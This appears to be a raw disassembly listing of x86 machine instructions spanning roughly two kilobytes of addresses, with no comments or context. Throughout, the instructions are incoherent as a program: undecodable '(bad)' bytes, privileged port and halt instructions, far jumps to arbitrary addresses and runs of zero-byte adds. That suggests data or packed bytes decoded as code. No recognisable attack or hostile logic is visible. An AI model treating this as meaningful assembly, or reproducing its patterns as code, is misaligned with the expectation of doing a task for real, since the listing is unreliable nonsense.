  43228a:	add    bl,cl
  43228c:	jle    0x432284
  43228e:	fnsave [esp+eax*1]
  432291:	jne    0x432295
  432293:	mov    ecx,0x1340341b
  432298:	xor    esi,esi
  43229a:	inc    ecx
  43229b:	xchg   ebx,eax
  43229c:	mov    ebx,0x3cc65e9
  4322a1:	xor    ah,BYTE PTR [ebx]
  4322a3:	call   0xff6a81c3
  4322a8:	cmc    
  4322a9:	mov    eax,gs:0x2d7e
  4322af:	add    BYTE PTR [eax],al
  4322b1:	add    BYTE PTR ds:0x76e902c1,cl
  4322b7:	add    dh,BYTE PTR [edi+eax*1-0x15]
  4322bb:	or     eax,0xbd1a7d8d
  4322c0:	add    ch,cl
  4322c2:	jbe    0x432339
  4322c4:	dec    ebx
  4322c5:	or     eax,0x16b41ae1
  4322ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322cb:	sub    BYTE PTR [ebp+ebp*1-0x51b01133],cl
  4322d2:	and    DWORD PTR [edx],0xd
  4322d5:	sub    DWORD PTR [ecx+0x75],edi
  4322d8:	dec    ebx
  4322d9:	(bad)
  4322dc:	mov    edx,0x65ff6038
  4322e1:	jmp    0xeba885a7
  4322e6:	mov    ds,WORD PTR [edx]
  4322e8:	mov    edx,0xa51b657c
  4322ed:	jle    0x432353
  4322ef:	sub    cl,dh
  4322f1:	in     al,0x96
  4322f3:	dec    eax
  4322f4:	ds jmp 0xd14fd160
  4322fa:	jbe    0x4322fe
  4322fc:	add    BYTE PTR [ecx-0x20],ch
  4322ff:	push   cs
  432300:	sti    
  432301:	hlt    
  432302:	mov    dh,0xe
  432304:	inc    eax
  432305:	jmp    0xa5d0261a
  43230a:	push   edx
  43230b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43230c:	dec    edi
  43230d:	shl    DWORD PTR [ebp-0x2f],0x3e
  432311:	add    edi,DWORD PTR [ecx+0x71]
  432314:	repnz add BYTE PTR es:[eax],al
  432318:	add    BYTE PTR [eax],al
  43231a:	add    BYTE PTR [ebp+0x16c5438e],al
  432320:	shl    BYTE PTR [ebp-0x17],cl
  432323:	loopne 0x432344
  432325:	stc    
  432326:	hlt    
  432327:	xchg   edx,eax
  432328:	repnz aas 
  43232a:	add    BYTE PTR [edi+ebx*4],bl
  43232d:	repnz test DWORD PTR [ebx],ebp
  432330:	pop    ecx
  432331:	add    al,0x57
  432333:	sub    edi,eax
  432335:	scas   eax,DWORD PTR es:[edi]
  432336:	adc    cl,ah
  432338:	add    eax,0x7ccfff4f
  43233d:	jmp    edi
  43233f:	adc    dl,dh
  432341:	cmc    
  432342:	inc    DWORD PTR [edx-0x38]
  432345:	ds and al,0xff
  432348:	push   es
  432349:	not    ebx
  43234b:	addr16 push edx
  43234d:	push   ds
  43234e:	adc    al,0xc5
  432350:	pop    edx
  432351:	(bad)  
  432352:	dec    esp
  432354:	test   BYTE PTR [esi+0x24],dh
  432357:	mov    esp,0x658506f5
  43235c:	pop    es
  43235d:	add    BYTE PTR [eax],al
  43235f:	data16 add al,0x68
  432362:	jnp    0x432304
  432364:	sahf   
  432365:	jge    0x43234f
  432367:	sub    al,0xd9
  432369:	cmc    
  43236a:	jmp    DWORD PTR ds:0x11101e4a
  432370:	mov    BYTE PTR ds:0x74c84,0x0
  432377:	cmp    DWORD PTR [edx+0x59f001e],ecx
  43237d:	add    BYTE PTR [eax+0x0],dl
  432380:	add    BYTE PTR [eax],al
  432382:	add    BYTE PTR [eax],al
  432384:	outs   dx,BYTE PTR ds:[esi]
  432385:	int    0xe2
  432387:	cmp    al,0x47
  432389:	shl    ebp,cl
  43238b:	test   BYTE PTR [edx+ebx*2-0x4],cl
  43238f:	std    
  432390:	lahf   
  432391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432392:	push   ds
  432393:	ficomp WORD PTR [edi]
  432395:	add    eax,0x16ab1662
  43239a:	cmc    
  43239b:	adc    eax,0x3ff508
  4323a0:	fucomip st,st(6)
  4323a2:	push   DWORD PTR [edx+ebx*2-0x3]
  4323a6:	loopne 0x432377
  4323a8:	jne    0x4323a0
  4323aa:	sub    al,BYTE PTR [edi-0x1706b84f]
  4323b0:	jne    0x4323dc
  4323b2:	(bad)  
  4323b3:	push   ebp
  4323b5:	add    eax,DWORD PTR ds:0xf1185075
  4323bb:	xchg   BYTE PTR [eax+0x57],bh
  4323be:	dec    esp
  4323bf:	ds jne 0x4323ea
  4323c2:	mov    cl,0x3
  4323c4:	popf   
  4323c5:	xor    bh,BYTE PTR [edi+edi*1]
  4323c8:	jne    0x43240d
  4323ca:	pusha  
  4323cb:	test   al,0xf8
  4323cd:	dec    edi
  4323ce:	sub    DWORD PTR [ebp+edi*2-0x6a],esi
  4323d2:	xchg   edx,eax
  4323d3:	and    ebp,ecx
  4323d5:	sub    bh,dh
  4323d7:	push   eax
  4323d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4323da:	loop   0x4323df
  4323dc:	jbe    0x432409
  4323de:	(bad)  
  4323df:	out    0xa3,eax
  4323e1:	inc    edi
  4323e2:	das    
  4323e3:	cli    
  4323e4:	ficom  WORD PTR [eax+0x16]
  4323e7:	test   DWORD PTR [eax],eax
  4323e9:	add    BYTE PTR [eax],al
  4323eb:	add    BYTE PTR [eax],al
  4323ed:	shl    BYTE PTR [edi+0x29],0x83
  4323f1:	mov    ch,0x3f
  4323f3:	xchg   eax,eax
  4323f5:	jne    0x432422
  4323f7:	(bad)  
  4323f8:	cli    
  4323f9:	bound  edx,QWORD PTR [edi+ecx*1+0x3ebc334]
  432400:	sti    
  432401:	and    bh,BYTE PTR [edi]
  432403:	xchg   esi,eax
  432404:	popa   
  432405:	mov    ch,0x6a
  432407:	(bad)  
  432408:	out    0x1d,eax
  43240a:	jb     0x43243b
  43240c:	cli    
  43240d:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43240f:	loop   0x432408
  432411:	jne    0x43243e
  432413:	(bad)  
  432414:	out    0xee,eax
  432416:	(bad)  
  432417:	das    
  432418:	cli    
  432419:	std    
  43241a:	gs loop 0x432427
  43241d:	mov    eax,ds:0x184f92a
  432422:	sub    bh,dh
  432424:	inc    DWORD PTR [eax]
  432426:	add    ebp,DWORD PTR [ebp-0x2a4d6919]
  43242c:	dec    edx
  43242d:	mov    bl,0xaa
  43242f:	push   0xb6027b4d
  432434:	xor    dh,0xe6
  432437:	lock add al,0x75
  43243a:	add    bl,BYTE PTR [ecx-0xe1a4de5]
  432440:	sub    eax,0x98d942f1
  432445:	mov    dh,0xe6
  432447:	icebp  
  432448:	jmp    0x4323f8
  43244a:	out    0xe9,al
  43244c:	mov    bh,0x8e
  43244e:	lods   al,BYTE PTR ds:[esi]
  43244f:	out    0x7e,eax
  432451:	add    BYTE PTR [eax],al
  432453:	add    BYTE PTR [eax],al
  432455:	add    BYTE PTR [esi+0x5ad444e6],dh
  43245b:	fist   WORD PTR ds:0x3e2a90c1
  432461:	fistp  WORD PTR ss:[edi]
  432464:	arpl   ax,cx
  432466:	xchg   esi,eax
  432467:	mov    ds:0x158d118,al
  43246c:	adc    esp,ecx
  43246e:	lods   al,BYTE PTR ds:[esi]
  43246f:	ret    
  432470:	call   0xf8198da1
  432475:	ret    
  432476:	mov    edx,0x56e8148c
  43247b:	mov    DWORD PTR [eax+ebp*8],ebp
  43247e:	or     BYTE PTR [ecx-0x5381180c],0x71
  432485:	jmp    0xd622ba65
  43248a:	(bad)  
  43248b:	cmc    
  43248c:	add    al,0x11
  43248e:	xor    eax,0x33fe4e02
  432493:	lea    ebp,[edi+eiz*8+0x1beb25a]
  43249a:	outs   dx,BYTE PTR ds:[esi]
  43249b:	cmc    
  43249c:	inc    esp
  43249d:	adc    al,0xb5
  43249f:	add    ch,BYTE PTR [esi-0x11]
  4324a2:	jbe    0x432497
  4324a4:	jmp    FWORD PTR [eax+0x55bd976]
  4324aa:	adc    DWORD PTR [esi-0x1cf2d9ff],0x1ca81e17
  4324b4:	jae    0x432483
  4324b6:	push   ds
  4324b7:	sbb    al,0xd2
  4324b9:	mov    bh,0x0
  4324bb:	add    BYTE PTR [eax],al
  4324bd:	add    BYTE PTR [eax],al
  4324bf:	popa   
  4324c0:	xor    al,0x86
  4324c2:	test   DWORD PTR [edx],edx
  4324c4:	repz cli 
  4324c6:	jne    0x4324e2
  4324c8:	psubsb mm1,QWORD PTR [edx-0x42]
  4324cc:	push   ds
  4324cd:	cli    
  4324ce:	imul   esp,edx,0xc5c010a
  4324d4:	sbb    al,0x34
  4324d6:	pop    ebp
  4324d7:	mov    bl,0xe0
  4324d9:	inc    eax
  4324db:	sub    eax,0xc9cefae1
  4324e0:	es dec ebx
  4324e2:	je     0x43247d
  4324e4:	sbb    al,0x85
  4324e6:	and    eax,0x175b0bcd
  4324eb:	lods   al,BYTE PTR ds:[esi]
  4324ec:	xchg   esp,esp
  4324ee:	or     al,0x37
  4324f0:	pop    es
  4324f1:	add    BYTE PTR [esp+ecx*2],bh
  4324f4:	sub    edx,DWORD PTR [eax+0x3a]
  4324f7:	les    ecx,FWORD PTR [ecx+0x2d]
  4324fa:	mov    dl,0x5e
  4324fc:	aaa    
  4324fd:	out    dx,al
  4324fe:	mov    fs,WORD PTR [ecx-0x7d]
  432501:	mov    edi,0xff3cf2f6
  432506:	call   0xeeaad881
  43250b:	neg    BYTE PTR [esi]
  43250d:	cli    
  43250e:	outs   dx,BYTE PTR ds:[esi]
  43250f:	imul   edi,DWORD PTR [esi],0x10
  432512:	test   eax,0x5d448d76
  432517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432518:	out    dx,eax
  432519:	(bad)  
  43251a:	push   esi
  43251b:	arpl   WORD PTR [edx],ax
  43251d:	pop    gs
  43251f:	jbe    0x4324d3
  432521:	cli    
  432522:	add    BYTE PTR [eax],al
  432524:	add    BYTE PTR [eax],al
  432526:	add    BYTE PTR [eax],al
  432528:	dec    ecx
  432529:	or     DWORD PTR ss:[eax+0x4c],eax
  43252d:	fwait
  43252e:	repnz test DWORD PTR [ebx+0x4f565855],esp
  432535:	fdiv   DWORD PTR [edi]
  432537:	pop    ebp
  432538:	nop
  432539:	outs   dx,DWORD PTR ds:[esi]
  43253a:	dec    eax
  43253b:	mov    ebx,DWORD PTR [eax-0x69]
  43253e:	add    eax,0xffffffd8
  432541:	inc    eax
  432542:	pusha  
  432543:	add    DWORD PTR [ebp+edi*1+0x73],0x3b
  432548:	and    edx,DWORD PTR [edi-0x770fdbe]
  43254e:	pusha  
  43254f:	je     0x432584
  432551:	and    edi,0x8
  432554:	mov    BYTE PTR [ecx+edi*2],ah
  432557:	jmp    0x49459377
  43255c:	test   eax,0xecb7923
  432561:	std    
  432562:	sbb    al,BYTE PTR [ebx-0x7ca1fce4]
  432568:	je     0x432570
  43256a:	je     0x432583
  43256c:	jl     0x432557
  43256e:	adc    edi,DWORD PTR [edx+edi*4+0x41]
  432572:	cli    
  432573:	pop    eax
  432574:	inc    DWORD PTR [edx]
  432576:	in     eax,0x43
  432578:	fdiv   st(4),st
  43257a:	add    al,BYTE PTR [ebx+0x3e2f707]
  432580:	dec    edi
  432581:	fld    QWORD PTR [edx]
  432583:	inc    esi
  432584:	(bad)  
  432585:	push   edx
  432586:	idiv   BYTE PTR [esi+ebp*2+0x31]
  43258a:	cmc    
  43258b:	adc    eax,0x0
  432590:	add    BYTE PTR [esp+esi*8],ah
  432593:	aas    
  432594:	add    BYTE PTR [edx-0x613c0fb7],al
  43259a:	ins    DWORD PTR es:[edi],dx
  43259b:	sbb    eax,ebp
  43259d:	dec    eax
  43259e:	mov    bl,0xf5
  4325a0:	jmp    DWORD PTR [edi+ebx*8]
  4325a3:	push   ebp
  4325a4:	push   DWORD PTR [ebp-0x4c]
  4325a7:	sub    eax,0xc2ed9504
  4325ac:	push   DWORD PTR [esi-0x6f]
  4325af:	dec    ebx
  4325b0:	jae    0x432543
  4325b2:	xor    esi,edi
  4325b4:	mov    bh,0x7d
  4325b6:	test   edx,0x4a1a5aff
  4325bc:	cli    
  4325bd:	dec    edx
  4325be:	lock add eax,0x1bea3687
  4325c4:	add    eax,DWORD PTR [ebx-0x25]
  4325c7:	fild   WORD PTR [eax]
  4325c9:	xor    BYTE PTR [ebp+0x281ec043],0xce
  4325d0:	jg     0x4325e8
  4325d2:	sub    dh,ch
  4325d4:	mov    cl,0x36
  4325d6:	jnp    0x4325ee
  4325d8:	or     al,0x11
  4325da:	sub    al,0x25
  4325dc:	test   DWORD PTR ds:0x697349af,ebp
  4325e2:	xor    eax,0xe81b1fff
  4325e7:	add    edi,esi
  4325e9:	data16 and BYTE PTR [edx+edi*8+0xd9a3dea],bl
  4325f1:	xor    eax,0xc8c92b
  4325f6:	add    BYTE PTR [eax],al
  4325f8:	add    BYTE PTR [eax],al
  4325fa:	mov    dh,0x17
  4325fc:	sub    DWORD PTR ds:[esi+0x25bf8a3b],0x64
  432604:	bsf    esp,DWORD PTR [edi-0x15]
  432608:	add    ecx,esp
  43260a:	and    BYTE PTR [eax+0x2aa18012],ah
  432610:	add    al,0x0
  432612:	jne    0x43260c
  432614:	int    0x52
  432616:	movaps XMMWORD PTR [esi+0x7db7cbef],xmm2
  43261d:	xchg   BYTE PTR [ebp-0x750b0a7e],cl
  432623:	add    DWORD PTR [edx-0xa],esp
  432626:	stos   DWORD PTR es:[edi],eax
  432627:	mov    ah,BYTE PTR [ecx-0x1ebebc05]
  43262d:	jg     0x4326a3
  43262f:	add    ecx,ebp
  432631:	add    edi,eax
  432633:	push   ebp
  432634:	call   0x505f8562
  432639:	cli    
  43263a:	sahf   
  43263b:	sbb    al,0x31
  43263d:	jle    0x4325f8
  43263f:	dec    esp
  432640:	gs mov eax,0x3f31c4e
  432646:	jne    0x4325ca
  432648:	call   0xd085b220
  43264d:	enter  0xb7a,0x74
  432651:	inc    ebx
  432652:	stos   DWORD PTR es:[edi],eax
  432653:	inc    edx
  432654:	in     eax,0xd3
  432656:	cwde   
  432657:	add    DWORD PTR [ecx+0x29027503],edx
  43265d:	js     0x43265f
  43265f:	add    BYTE PTR [eax],al
  432661:	add    BYTE PTR [eax],al
  432663:	mov    bh,0xf2
  432665:	cwde   
  432666:	js     0x432619
  432668:	push   ds
  432669:	rcr    BYTE PTR [edi-0x7f26e3b2],1
  43266f:	mov    edx,0xf25a6d0b
  432674:	sbb    ebp,eax
  432676:	jbe    0x4326a9
  432678:	push   ds
  432679:	sbb    BYTE PTR [edi+0x69],dh
  43267c:	adc    dl,al
  43267e:	jae    0x43260e
  432680:	sbb    al,0xb1
  432682:	adc    BYTE PTR [edx],0xc
  432685:	gs mov cs,edx
  432688:	sbb    ebp,eax
  43268a:	jmp    0x9df5:0xfb111621
  432691:	cwde   
  432692:	add    al,0x75
  432694:	add    bh,cl
  432696:	mov    ch,0x67
  432698:	scas   eax,DWORD PTR es:[edi]
  432699:	adc    eax,0x7cc5f1d5
  43269e:	sbb    al,0x9f
  4326a0:	out    dx,al
  4326a1:	push   DWORD PTR [esi+0x5c]
  4326a4:	jg     0x432665
  4326a6:	cmc    
  4326a7:	sbb    DWORD PTR [eax],0x74
  4326aa:	gs dec esp
  4326ac:	neg    BYTE PTR [ebx-0x5]
  4326af:	mov    dh,0x1b
  4326b1:	sub    DWORD PTR [ecx],0x22
  4326b4:	hlt    
  4326b5:	mov    WORD PTR [edx+edx*4-0x70eafcdd],fs
  4326bc:	sbb    BYTE PTR [eax+0x2764f],bh
  4326c2:	rcr    BYTE PTR fs:[ebx],cl
  4326c5:	cld    
  4326c6:	add    BYTE PTR cs:[eax],al
  4326c9:	add    BYTE PTR [eax],al
  4326cb:	add    BYTE PTR [ebx+eax*4-0x6a0056e9],bl
  4326d2:	cmc    
  4326d3:	adc    bl,bh
  4326d5:	add    DWORD PTR [ebp+edx*1+0x5c],0xffffff96
  4326da:	in     eax,0x6a
  4326dc:	loop   0x4326f4
  4326de:	cli    
  4326df:	cdq    
  4326e0:	jle    0x4326e0
  4326e2:	int    0xfc
  4326e4:	dec    ebp
  4326e5:	aam    0xbe
  4326e7:	jl     0x432700
  4326e9:	int3   
  4326ea:	out    0x8c,eax
  4326ec:	jbe    0x4326f0
  4326ee:	add    BYTE PTR [ebx+eax*8+0x16],dh
  4326f2:	out    0xae,eax
  4326f4:	sbb    DWORD PTR [ecx],ebx
  4326f6:	cli    
  4326f7:	nop
  4326f8:	mov    WORD PTR [edx],es
  4326fa:	add    cl,ch
  4326fc:	arpl   WORD PTR [esi+0x188dc6ff],ax
  432702:	xchg   ecx,esp
  432704:	mov    dh,0xc9
  432706:	je     0x4326bb
  432708:	jno    0x4326e4
  43270a:	mov    BYTE PTR [esi],ah
  43270c:	int    0x8d
  43270e:	inc    esp
  43270f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432710:	pop    esi
  432711:	push   edx
  432712:	es lahf 
  432714:	lea    ebx,[edx-0x17]
  432717:	call   0x64d02992
  43271c:	jbe    0x432736
  43271e:	cli    
  43271f:	add    bl,bh
  432721:	xchg   esi,eax
  432722:	adc    al,BYTE PTR [eax+0x65]
  432725:	imul   esi,esp,0xffffffb0
  432728:	popf   
  432729:	std    
  43272a:	adc    DWORD PTR [ebp-0x6b1d15af],ecx
  432730:	add    BYTE PTR [eax],al
  432732:	add    BYTE PTR [eax],al
  432734:	add    BYTE PTR [edi-0x18],ah
  432737:	cmc    
  432738:	mov    ecx,0x2a
  43273d:	fstp   DWORD PTR [eax-0x15440206]
  432743:	sbb    BYTE PTR [eax],0xc
  432746:	pop    ebp
  432747:	jae    0x432743
  432749:	pop    esi
  43274a:	(bad)  
  43274b:	push   ebp
  43274c:	pop    esi
  43274d:	out    0xdc,eax
  43274f:	mov    esp,0x81495c04
  432754:	in     al,dx
  432755:	int    0xf1
  432757:	out    dx,al
  432758:	add    DWORD PTR [esi+eax*1+0x4b],ecx
  43275c:	xor    esp,DWORD PTR [edi+0x33]
  43275f:	aaa    
  432760:	pop    edi
  432761:	dec    eax
  432762:	push   0x57
  432764:	cmp    cl,bl
  432766:	sbb    eax,0xa8893773
  43276b:	or     bh,dh
  43276d:	or     esp,edx
  43276f:	loop   0x43275a
  432771:	(bad)  
  432772:	jmp    0x432769
  432774:	cmp    DWORD PTR [ecx+0x55056dcc],edi
  43277a:	dec    ebx
  43277b:	shl    BYTE PTR [esi-0x13],1
  43277e:	pushf  
  43277f:	push   ebp
  432780:	or     al,0x49
  432782:	inc    ebx
  432783:	rcl    BYTE PTR [eax+0x7c],1
  432786:	cs dec edx
  432788:	call   0x3b57cc
  43278d:	iret   
  43278e:	int3   
  43278f:	mov    bh,0xee
  432791:	fld    QWORD PTR ds:0xee518d00
  432797:	cmc    
  432798:	inc    DWORD PTR [eax]
  43279a:	add    BYTE PTR [eax],al
  43279c:	add    BYTE PTR [eax],al
  43279e:	fist   DWORD PTR [esi-0x1d8abfee]
  4327a4:	mov    al,0xf5
  4327a6:	(bad)  
  4327a7:	lock div DWORD PTR [esi]
  4327aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4327ab:	pop    ss
  4327ac:	jmp    edi
  4327ae:	pop    edi
  4327af:	jp     0x4327d9
  4327b1:	cli    
  4327b2:	cld    
  4327b3:	lock div DWORD PTR [edi]
  4327b6:	sub    BYTE PTR [ebx],ah
  4327b8:	stos   BYTE PTR es:[edi],al
  4327b9:	or     al,dh
  4327bb:	push   0x158d500e
  4327c0:	sar    ecx,1
  4327c2:	jb     0x432768
  4327c4:	mov    edx,0xafecae07
  4327c9:	or     ch,al
  4327cb:	mov    bl,0x35
  4327cd:	mov    eax,ds:0x5a7cd858
  4327d2:	jge    0x432845
  4327d4:	(bad)
  4327d7:	pop    ds
  4327d8:	(bad)  
  4327d9:	push   esp
  4327da:	out    dx,al
  4327db:	out    dx,al
  4327dc:	jle    0x432840
  4327de:	ins    DWORD PTR es:[edi],dx
  4327df:	sub    edi,DWORD PTR [ebp+0x62]
  4327e2:	sub    DWORD PTR [ebx],0x2d8deb83
  4327e8:	(bad)  
  4327e9:	inc    esi
  4327eb:	jns    0x432864
  4327ed:	mov    ah,0xf
  4327ef:	push   ss
  4327f0:	and    edx,edi
  4327f2:	add    BYTE PTR [eax+0xe],dh
  4327f5:	call   0xfa677d96
  4327fa:	js     0x432879
  4327fc:	add    eax,DWORD PTR [eax]
  4327fe:	jne    0x4327b5
  432800:	(bad)  
  432802:	add    BYTE PTR [eax],al
  432804:	add    BYTE PTR [eax],al
  432806:	add    BYTE PTR [edi+0x2b],bl
  432809:	ja     0x43287f
  43280b:	int    0xab
  43280d:	ss cli 
  43280f:	int    0x6
  432811:	mov    ah,0xfa
  432813:	ficomp DWORD PTR [ebp-0x5b9586c2]
  432819:	cmp    al,0x4f
  43281b:	pop    ebp
  43281c:	mov    ds:0x2753e1e,eax
  432821:	ss sbb al,0xbe
  432824:	dec    esp
  432825:	call   0xea90:0xe141f926
  43282c:	jge    0x4327d6
  43282e:	mov    al,0x79
  432830:	aad    0xa8
  432832:	popf   
  432833:	in     eax,dx
  432834:	add    al,0x40
  432836:	adc    eax,0x78e90275
  43283b:	icebp  
  43283c:	sub    ebp,DWORD PTR [ebx+0x26]
  43283f:	jg     0x432880
  432841:	call   0xd40e5d49
  432846:	sub    al,0xcc
  432848:	mov    ebp,DWORD PTR [ecx]
  43284a:	retf   0x443d
  43284d:	mov    bl,0x7a
  43284f:	dec    esi
  432850:	test   BYTE PTR [ebx+ebp*1-0xb],cl
  432854:	es call 0x5e459d5b
  43285a:	shl    BYTE PTR [edx-0x2d],0x1f
  43285e:	int    0xa7
  432860:	mov    DWORD PTR [edi+ebx*8-0x50d82492],esi
  432867:	xor    BYTE PTR [ebx+0xd4e0],cl
  43286d:	add    BYTE PTR [eax],al
  43286f:	add    bl,dh
  432871:	inc    ebx
  432872:	add    BYTE PTR [ebp+0x21],ch
  432875:	sbb    BYTE PTR [ecx],al
  432877:	jg     0x432853
  432879:	pop    es
  43287a:	xchg   BYTE PTR gs:[edx],dl
  43287d:	sbb    al,ch
  43287f:	js     0x432807
  432881:	(bad)  
  432883:	cmp    eax,0x3f8deb6
  432888:	or     eax,0xef261f22
  43288d:	mov    edx,DWORD PTR [ebp-0x8]
  432890:	shl    BYTE PTR [esi-0x49],cl
  432893:	daa    
  432894:	fistp  QWORD PTR [esi-0x58]
  432897:	mov    al,0x51
  432899:	mov    edi,DWORD PTR ds:0xff7f01f8
  43289f:	or     al,0x29
  4328a1:	pop    ss
  4328a2:	cli    
  4328a3:	jmp    0xcd86af4e
  4328a8:	data16 mov dl,0xe7
  4328ab:	icebp  
  4328ac:	inc    esp
  4328ad:	push   ss
  4328ae:	cli    
  4328af:	ins    DWORD PTR es:[edi],dx
  4328b0:	xor    DWORD PTR [ebx-0x1c1a9db5],edx
  4328b6:	or     esi,DWORD PTR [ebp+ecx*8-0x1d]
  4328ba:	adc    esi,DWORD PTR [eax-0x3b]
  4328bd:	jecxz  0x4328d2
  4328bf:	xor    ecx,0xf56efc60
  4328c5:	push   edi
  4328c6:	je     0x4328c9
  4328c8:	cli    
  4328c9:	adc    BYTE PTR [ebx-0x14],dh
  4328cc:	cdq    
  4328cd:	shl    edi,1
  4328cf:	jp     0x4328bf
  4328d1:	sbb    al,0xfa
  4328d3:	mov    bh,0x0
  4328d5:	add    BYTE PTR [eax],al
  4328d7:	add    BYTE PTR [eax],al
  4328d9:	jle    0x432861
  4328db:	mov    BYTE PTR [esi-0x70],al
  4328de:	cwde   
  4328df:	arpl   WORD PTR ds:0xde5174d,ax
  4328e5:	int3   
  4328e6:	mov    esi,0x93b96407
  4328eb:	pop    es
  4328ec:	jb     0x4328ea
  4328ee:	or     al,BYTE PTR [edi+0x78a4eb0]
  4328f4:	bound  esi,QWORD PTR [ebx+ecx*1]
  4328f7:	xchg   DWORD PTR [ecx+0x72068a1e],esp
  4328fd:	xor    DWORD PTR [ebx],ecx
  4328ff:	mov    DWORD PTR [edx+0x2f042012],ebp
  432905:	xor    eax,0x59e80fe3
  43290a:	xchg   ebx,eax
  43290b:	and    edi,ecx
  43290d:	jge    0x43291f
  43290f:	out    0x34,eax
  432911:	fwait
  432912:	sbb    al,0xfa
  432914:	nop
  432915:	add    BYTE PTR [edx],0x0
  432918:	jmp    0x66ec88
  43291d:	aam    0xd4
  43291f:	cli    
  432920:	call   FWORD PTR [ebx+ebx*2+0x5757f973]
  432927:	push   ds
  432928:	or     al,0x73
  43292a:	inc    eax
  43292b:	and    ebp,0xfffec431
  432931:	imul   ebx,DWORD PTR [ecx-0x15077c1a],0x31b0ec79
  43293b:	push   eax
  43293c:	push   edi
  43293d:	add    BYTE PTR [eax],al
  43293f:	add    BYTE PTR [eax],al
  432941:	add    BYTE PTR [esp+edi*1],al
  432944:	ud0    edx,DWORD PTR [ebx]
  432947:	xor    esp,edx
  432949:	jo     0x432990
  43294b:	(bad)  
  43294d:	mov    esp,esp
  43294f:	xchg   edi,eax
  432950:	ror    DWORD PTR [edi],1
  432952:	or     BYTE PTR [ebx],ah
  432954:	(bad)  
  432955:	call   FWORD PTR [ebp+ecx*4+0x76]
  432959:	and    al,0x6c
  43295b:	cdq    
  43295c:	push   esi
  43295d:	and    al,0x5c
  43295f:	cli    
  432960:	loope  0x43290c
  432962:	mov    cl,0xde
  432964:	jle    0x432926
  432966:	arpl   WORD PTR [esi+0x25c00f8],dx
  43296c:	lea    esi,[eax+edi*2+0x22]
  432970:	loop   0x43294d
  432972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432973:	fdivr  st(5),st
  432975:	push   0x3d
  432977:	fwait
  432978:	rcl    BYTE PTR [eax-0xa],0x79
  43297c:	dec    ecx
  43297d:	call   0x3bce54
  432982:	mov    cl,al
  432984:	add    eax,0x17c84
  432989:	add    BYTE PTR [edi-0x2c17b52a],dl
  43298f:	mov    edx,0xbe88fffb
  432994:	add    eax,0xffff2c84
  432999:	push   DWORD PTR [ebp-0x62]
  43299c:	xchg   edi,eax
  43299d:	and    ecx,DWORD PTR [ecx-0x27562ebd]
  4329a3:	cmp    al,0xa9
  4329a5:	or     al,0x0
  4329a7:	add    BYTE PTR [eax],al
  4329a9:	add    BYTE PTR [eax],al
  4329ab:	(bad)  
  4329ac:	pop    ebp
  4329ad:	mov    bl,0x65
  4329af:	pop    eax
  4329b0:	clc    
  4329b1:	sub    ebp,DWORD PTR [edi]
  4329b3:	or     BYTE PTR [esi+0x1e],ah
  4329b6:	xor    DWORD PTR [ebp+0x75ad820c],0x2b
  4329bd:	dec    BYTE PTR [ecx+esi*1-0x72b011b9]
  4329c4:	inc    ecx
  4329c5:	push   ebx
  4329c6:	cld    
  4329c7:	call   0xe40f:0x8b841390
  4329ce:	cli    
  4329cf:	add    DWORD PTR [edi-0x12],eax
  4329d2:	push   ecx
  4329d3:	unpcklps xmm6,XMMWORD PTR [ecx+0x1d766ee7]
  4329da:	cli    
  4329db:	retf   
  4329dc:	xchg   ebx,eax
  4329dd:	(bad)  
  4329de:	and    eax,DWORD PTR [esi+0x628771c3]
  4329e4:	les    eax,FWORD PTR [ebx-0x1f36e85]
  4329ea:	or     bh,cl
  4329ec:	stos   BYTE PTR es:[edi],al
  4329ed:	add    eax,DWORD PTR [eax]
  4329ef:	jne    0x43299c
  4329f1:	mov    al,ds:0x984f7507
  4329f6:	mov    WORD PTR [ecx+0x1d4fee47],?
  4329fc:	xchg   ebx,eax
  4329fd:	ins    DWORD PTR es:[edi],dx
  4329fe:	cld    
  4329ff:	sub    ah,BYTE PTR [eax+0x6f2b8413]
  432a05:	add    bl,bh
  432a07:	mov    eax,ds:0x9f51ee47
  432a0c:	test   DWORD PTR [ecx+0xe7],esi
  432a12:	add    BYTE PTR [eax],al
  432a14:	xlat   BYTE PTR es:[ebx]
  432a16:	sbb    eax,0xc7a3abfa
  432a1b:	and    esp,DWORD PTR [esi+0x2]
  432a1e:	sar    DWORD PTR [ebp-0x7c26eb06],1
  432a24:	outs   dx,BYTE PTR ds:[esi]
  432a25:	fsubrp st(1),st
  432a27:	add    ebp,DWORD PTR [ecx-0x3a]
  432a2a:	pop    ebx
  432a2b:	lahf   
  432a2c:	xchg   esi,eax
  432a2d:	out    dx,al
  432a2e:	rcr    cl,1
  432a30:	and    edx,DWORD PTR [edi]
  432a32:	mov    ecx,0xa9897aad
  432a37:	mov    bl,0x58
  432a39:	xchg   edx,eax
  432a3a:	adc    eax,0xa24e0e2c
  432a3f:	and    dh,dh
  432a41:	inc    ecx
  432a42:	adc    al,0xd6
  432a44:	stc    
  432a45:	mov    ebp,0x2a32f3cc
  432a4a:	jnp    0x432aa2
  432a4c:	cdq    
  432a4d:	adc    al,0x6d
  432a4f:	adc    edi,ecx
  432a51:	or     esi,esp
  432a53:	add    DWORD PTR [esi+0x24f3cc8d],ecx
  432a59:	test   al,0xf7
  432a5b:	mov    dh,0x92
  432a5d:	mov    BYTE PTR [ecx+eiz*1-0x388f5291],bl
  432a64:	xchg   esi,eax
  432a65:	out    dx,eax
  432a66:	inc    eax
  432a67:	cmc    
  432a68:	cli    
  432a69:	adc    ecx,DWORD PTR [ecx-0x7d]
  432a6c:	(bad)  
  432a6e:	icebp  
  432a6f:	add    ecx,ecx
  432a71:	(bad)  
  432a72:	ins    DWORD PTR es:[edi],dx
  432a73:	inc    esi
  432a74:	push   ebx
  432a75:	add    al,0x32
  432a77:	(bad)  
  432a78:	add    BYTE PTR [eax],al
  432a7a:	add    BYTE PTR [eax],al
  432a7c:	add    BYTE PTR [edx+0x3],bl
  432a7f:	popa   
  432a80:	and    bh,BYTE PTR [edi]
  432a82:	mov    al,0x10
  432a84:	sbb    eax,0xd61913f7
  432a89:	jmp    0xab1d:0xfbbeb2b3
